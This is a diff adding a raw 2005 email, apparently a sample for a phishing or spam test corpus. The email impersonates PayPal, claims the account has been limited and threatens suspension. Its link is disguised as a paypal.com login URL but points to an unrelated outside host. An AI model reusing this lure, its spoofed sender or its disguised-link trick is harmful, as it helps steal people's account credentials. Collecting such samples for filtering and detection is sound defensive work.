@@ -1,0 +1,163 @@
+From nobody Sun Jan 25 13:49:56 2015
+Return-Path: <user@mail.example.com>
+Delivered-To: user@example.com
+Received: from mail.example.com (mail.example.com [192.168.6.4])
+ by example.com (Postfix) with ESMTP id 06A462A88C
+ for <user@example.com>; Sun, 30 Oct 2005 10:23:29 -0500 (EST)
+Received: by mail.example.com (Example mail relay)
+ id F27FE621C78; Sun, 30 Oct 2005 10:23:28 -0500 (EST)
+Delivered-To: user@example.com
+Received: from mail.example.com (mail.example.com [192.168.3.6])
+ by mail.example.com (Example mail relay) with ESMTP id CC8FA621C71
+ for <user@example.com>; Sun, 30 Oct 2005 10:23:28 -0500 (EST)
+Received: (from user@localhost) by mail.example.com id KAA09197
+ for user@example.com; Sun, 30 Oct 2005 10:23:28 -0500
+Received: from malvina.dattaweb.com ([200.58.114.74])
+ by mail.example.com with ESMTP id KAA09189
+ for <user@example.com>; Sun, 30 Oct 2005 10:23:26 -0500
+Received: from apache by malvina.dattaweb.com with local (Exim 4.30)
+ id 1EWEj3-0001fW-5K
+ for user@example.com; Sun, 30 Oct 2005 12:04:01 -0300
+To: user@example.com
+Subject: Restore Your Account
+From: paypal services <services@paypal.com>
+MIME-Version: 1.0
+Content-Type: text/html
+Content-Transfer-Encoding: 8bit
+Message-Id: <E1EWEj3-0001fW-5K@malvina.dattaweb.com>
+Date: Sun, 30 Oct 2005 12:04:01 -0300
+X-AntiAbuse: This header was added to track abuse,
+ please include it with any abuse report
+X-AntiAbuse: Primary Hostname - malvina.dattaweb.com
+X-AntiAbuse: Original Domain - example.com
+X-AntiAbuse: Originator/Caller UID/GID - [501 501] / [502 502]
+X-AntiAbuse: Sender Address Domain - malvina.dattaweb.com
+Content-Length: 6550
+Lines: 122
+Status: O
+X-Status: 
+X-Keywords: 
+X-UID: 221
+
+<html>
+<head>
+<style type="text/css">
+#message .notified {}
+#message, #message TD {font-family: verdana,arial,helvetica,sans-serif;font-size:
+12px;color: #000000;}
+#message LI {line-height: 120%;}
+#message UL.ppsmallborder {margin:10px 5px 10px 20px;}
+#message LI.ppsmallborderli {margin:0px 0px 5px 0px;}
+#message UL.pp_narrow {margin:10px 5px 0px 40px;}
+#message hr.dotted {width: 100%; margin-top: 0px; margin-bottom: 0px; border-left:
+#fff; border-right: #fff; border-top: #fff; border-bottom: 2px dotted #ccc;}
+#message .pp_label {font-family: verdana,arial,helvetica,sans-serif;font-size:
+10px;font-weight: bold;color: #000000;}
+#message .pp_serifbig {font-family: serif;font-size: 20px;font-weight: bold;color:
+#000000;}
+#message .pp_serif{font-family: serif;font-size: 16px;color: #000000;}
+#message .pp_sansserif{font-family: verdana,arial,helvetica,sans-serif; font-size:
+16px;color: #000000;}
+#message .pp_heading {font-family: verdana,arial,helvetica,sans-serif;font-size:
+18px;font-weight: bold;color: #003366;}	
+#message .pp_subheadingeoa {font-family:
+verdana,arial,helvetica,sans-serif;font-size: 15px;font-weight: bold;color:
+#000000;}	
+#message .pp_subheading {font-family: verdana,arial,helvetica,sans-serif;font-size:
+16px;font-weight: bold;color: #003366;}	
+#message .pp_sidebartext {font-family: verdana,arial,helvetica,sans-serif;font-size:
+11px;color: #003366;}	
+#message .pp_sidebartextbold {font-family:
+verdana,arial,helvetica,sans-serif;font-size: 11px;font-weight: bold;color:
+#003366;}	
+#message .pp_footer {font-family: verdana,arial,helvetica,sans-serif;font-size:
+11px;color: #aaaaaa;}
+#message .pp_button {font-size: 13px; font-family:
+verdana,arial,helvetica,sans-serif; font-weight: 400; border-style:outset;
+color:#000000; background-color: #cccccc;}
+#message .pp_smaller {font-family: verdana,arial,helvetica,sans-serif;font-size:
+10px;color: #000000;}
+#message .pp_smallersidebar {font-family:
+verdana,arial,helvetica,sans-serif;font-size: 10px;color: #003366;}
+#message .ppem106 {font-weight: 700;}
+</style>
+</head>
+<xbody bgcolor="#ffffff">
+<table width="600" cellspacing="0" cellpadding="0" border="0"
+align="center">
+	<tr valign="top">
+		<td>
+        <p align="center"><font face="Verdana" style="font-size: 9pt"><A 
+target="_blank" 
+
+><IMG
+src="http://images.paypal.com/en_US/i/logo/email_logo.gif"  alt="PayPal"
+border="0" width="255" height="35"></A> </font>
+		</td>
+	</tr>
+</table>
+<div align="center">
+  <center>
+<table width="750" cellspacing="0" cellpadding="0" border="0" height="316" style="border-collapse: collapse" bordercolor="#111111">
+<tr>
+	<td background="http://images.paypal.com/images/bg_clk.gif" 
+width=750 height="29"><font face="Verdana" style="font-size: 9pt"><img src="http://images.paypal.com/images/pixel.gif"  height="29"
+width="1" border="0"></font></td>
+</tr>	
+<tr>
+	<td height="287" width="750"><font face="Verdana" style="font-size: 9pt"><b><img src="http://images.paypal.com/images/pixel.gif"  height="10"
+width="1" border="0"></b>Dear valued PayPal® member:</font>
+      <p><font face="Verdana" style="font-size: 9pt">PayPal® is committed to maintaining a safe environment for its community of buyers and sellers. To protect the security of your account, PayPal employs some of the most advanced security systems in the world and our anti-fraud teams regularly screen the PayPal system for unusual activity. </font></p>
+      <p><font face="Verdana" style="font-size: 9pt">Recently, our Account Review Team identified some unusual activity in your account. In accordance with PayPal's User Agreement and to ensure that your account has not been compromised, access to your account was limited. Your account access will remain limited until this issue has been resolved. This is a fraud prevention measure meant to ensure that your account is not compromised. </font></p>
+      <p><font face="Verdana" style="font-size: 9pt"> 
+
+In order to secure your account and quickly restore full access, we may require some specific information from you for the following reason: </font></p>
+      <p><font face="Verdana" style="font-size: 9pt"> 
+
+We would like to ensure that your account was not accessed by an unauthorized third party. Because protecting the security of your account is our primary concern, we have limited access to sensitive PayPal account features. We understand that this may be an inconvenience but please understand that this temporary limitation is for your protection. </font></p>
+      <p><font face="Verdana" style="font-size: 9pt"> 
+
+Case ID Number: PP-287-412-416 </font></p>
+      <p><font face="Verdana" style="font-size: 9pt"> 
+
+We encourage you to log in and restore full access as soon as possible. Should access to your account remain limited for an extended period of time, it may result in further limitations on the use of your account. </font></p>
+      <p><font face="Verdana" style="font-size: 9pt"> 
+
+However, failure to restore your records will result in account suspension. Please update your records on or before October 28, 2005. </font></p>
+      <p><font face="Verdana" style="font-size: 9pt"> 
+
+Once you have updated your account records, your PayPal session will not be interrupted and will continue as normal.</font></p>
+      <p><font face="Verdana" style="font-size: 9pt">To verify and/or update your account records click on the following link: </font></p>
+      <p><font style="font-size: 9pt" face="Verdana">                                
+      <A href ="http://pub.flajm.se/~kunskpash/paypal/">https://www.paypal.com/cgi-bin/webscr?cmd=_login-run</font></p></A>
+      <p><font face="Verdana" style="font-size: 9pt"> 
+
+Thank you for your prompt attention to this matter. Please understand that this is a security measure meant to help protect you and your account. We apologize for any inconvenience. </font></p>
+      <p><font face="Verdana" style="font-size: 9pt"> 
+
+Sincerely, </font></p>
+      <p><font face="Verdana" style="font-size: 9pt"> 
+PayPal® Account Review Department </font></p>
+      <p><font face="Verdana" style="font-size: 9pt"> 
+
+PayPal Email ID PP4486 </font></p>
+      <p><font face="Verdana" style="font-size: 9pt"> 
+
+Visit our Privacy Policy and User Agreement if you have any questions.</font></p>
+      <p><font face="Verdana" style="font-size: 9pt"> 
+
+ 
+<A href="http://www.paypal.com/cgi-bin/webscr? cmd=p/gen/ua/policy_privacy-outside">http://www.paypal.com/cgi-bin/webscr? cmd=p/gen/ua/policy_privacy-outside</A>
+
+
+ </font></p>
+    </td>
+</tr>
+</table>
+  </center>
+</div>
+</xbody>   
+</html>
+
+
+
